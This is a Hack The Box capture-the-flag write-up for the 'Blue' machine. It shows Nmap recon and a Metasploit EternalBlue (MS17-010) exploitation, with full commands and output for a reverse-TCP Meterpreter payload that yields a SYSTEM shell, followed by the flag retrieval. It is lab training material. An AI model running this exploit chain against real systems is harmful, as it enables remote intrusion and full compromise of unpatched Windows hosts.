# HTB: Blue — Writeup

**Difficulty:** Easy
**OS:** Windows
**Techniques:** MS17-010 (EternalBlue) SMB remote code execution

---

## Overview

Blue is an unpatched Windows 7 SP1 host vulnerable to MS17-010 (EternalBlue). A single Metasploit exploit against the SMB service grants a SYSTEM-level Meterpreter session directly — no separate privilege escalation step is required, so both flags are retrieved from the same shell.

---

## Recon

### Nmap

```
┌─[darkangel@parrot]─[~/HTB/Blue]
└──╼./ports.sh 10.10.10.40 nmap/blue
# Nmap 7.94SVN scan initiated Sun Sep  1 13:26:41 2024 as: nmap -sC -sV -p135,139,445,49152,49153,49154,49155,49156,49157 -oA nmap/blue 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.028s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-01T13:27:48+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-09-01T12:27:44
|_  start_date: 2024-09-01T12:18:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  1 13:27:50 2024 -- 1 IP address (1 host up) scanned in 69.44 seconds
```

Only SMB/RPC exposed. The SMB banner directly identifies the host as **Windows 7 Professional 7601 Service Pack 1** with message signing disabled — a strong indicator the box is vulnerable to MS17-010 (EternalBlue).

---

## Exploitation — MS17-010 (EternalBlue)

Metasploit was used to confirm and exploit the vulnerability:

```
[msf](Jobs:0 Agents:0) >> search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhost 10.10.10.40
rhost => 10.10.10.40
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 10.10.14.3:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.40:49160) at 2024-09-01 13:49:53 +0100

(Meterpreter 1)(C:\Windows\system32) > shell
Process 3052 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

`ETERNALBLUE overwrite completed successfully` — the exploit yields a Meterpreter session running as `nt authority\system` immediately, no separate privilege escalation needed.

---

## Flags

```
C:\Windows\system32>dir C:\Users
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,425,913,344 bytes free

C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
type C:\Users\haris\Desktop\user.txt
6c89ecd17fe0e78741bf0a40ce8b5497

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
0e773efd89c305283e03ea4bfd43d09e
```

Both `user.txt` and `root.txt` retrieved from the SYSTEM shell.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Recon | Nmap identifying an unpatched Windows 7 SP1 SMB service |
| Exploitation | MS17-010 (EternalBlue) via `exploit/windows/smb/ms17_010_eternalblue` in Metasploit — remote kernel pool corruption yielding a SYSTEM shell directly |

---

## Lessons / Takeaways

- MS17-010 is a textbook example of an exploit that skips the usual user → root progression entirely — SMB kernel-level exploits like EternalBlue often land straight at SYSTEM.
- Message signing disabled on SMB is not itself the vulnerability, but is a strong contextual signal worth noting alongside an unpatched OS version.
